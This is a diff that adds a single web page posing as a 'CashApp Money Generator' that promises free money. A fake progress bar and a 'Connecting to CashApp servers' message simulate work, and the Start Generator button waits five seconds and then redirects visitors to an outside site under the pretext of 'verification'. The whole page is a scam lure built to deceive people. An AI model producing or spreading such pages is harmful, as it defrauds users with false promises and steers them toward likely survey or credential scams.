@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CashApp Money Generator - Instantly Generate Free CashApp Money</title>
+  <meta name="description" content="CashApp Money Generator - Instantly generate free CashApp money with our easy-to-use tool. No downloads, 100% free!">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #111;
+      color: #fff;
+      overflow-x: hidden;
+    }
+    .header {
+      background: linear-gradient(to right, #00c853, #00e676);
+      padding: 2rem;
+      text-align: center;
+    }
+    .header h1 {
+      font-size: 2.5rem;
+      margin: 0;
+    }
+    .steps {
+      padding: 2rem;
+      text-align: center;
+    }
+    .steps h2 {
+      margin-bottom: 1rem;
+    }
+    .step-box {
+      margin: 1rem 0;
+      padding: 1.5rem;
+      background: #1f1f1f;
+      border-radius: 12px;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .step-box span {
+      display: block;
+      font-size: 1.2rem;
+      margin-top: 0.5rem;
+    }
+    .generator {
+      text-align: center;
+      margin-top: 2rem;
+    }
+    .progress {
+      width: 80%;
+      height: 20px;
+      background: #333;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 1rem auto;
+    }
+    .bar {
+      height: 100%;
+      background: #00e676;
+      width: 0;
+      animation: loadBar 5s forwards;
+    }
+    .status {
+      font-size: 1rem;
+      margin-top: 1rem;
+    }
+    .btn-start {
+      margin-top: 2rem;
+      padding: 1rem 2rem;
+      background: #00c853;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn-start:hover {
+      background-color: #00e676;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes loadBar {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>CashApp Money Generator</h1>
+    <p>Instantly generate free CashApp money. 100% legit & working!</p>
+  </div>
+  <div class="steps">
+    <h2>Follow the Steps Below</h2>
+    <div class="step-box">
+      <strong>Step 1:</strong>
+      <span>Enter your CashApp Username</span>
+    </div>
+    <div class="step-box">
+      <strong>Step 2:</strong>
+      <span>Select your desired amount</span>
+    </div>
+    <div class="step-box">
+      <strong>Step 3:</strong>
+      <span>Click Generate & Complete Verification</span>
+    </div>
+  </div>
+  <div class="generator">
+    <div class="progress">
+      <div class="bar"></div>
+    </div>
+    <div class="status">Connecting to CashApp servers...</div>
+    <button class="btn-start" onclick="startGenerator()">Start Generator</button>
+  </div>
+  <script>
+    function startGenerator() {
+      document.querySelector('.status').innerText = "Verifying... Please wait...";
+      setTimeout(() => {
+        window.location.href = "https://free24.raj-solution.com/cashapp-money-generator";
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
